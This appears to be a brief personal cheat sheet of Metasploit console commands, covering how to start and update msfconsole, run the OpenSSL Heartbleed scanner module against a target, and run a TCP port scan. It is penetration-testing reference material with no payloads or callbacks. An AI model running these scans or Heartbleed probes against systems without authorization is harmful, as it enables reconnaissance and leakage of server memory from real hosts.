Metasploit Scanners

#### Usage

	$ msfconsole    # starts metasploit
	$ msfupdate     # updates metasploit
	run + two tabs  # lists all meterpreter scripts


#### Heartbleed scanner
	
	msf> use auxiliary/scanner/ssl/openssl_heartbleed
	msf> set VERBOSE true
	msf> set RHOSTS [TARGET]
	msf> show options
	msf> exploit


#### Port scan
	
	msf> use auxiliary/scanner/portscan/tcp
	mst> set PORTS 1-500
	msf> set RHOSTS [TARGET]
	msf> set THREADS 10  # makes the scan multithreaded
	msf> show options
	msf> run
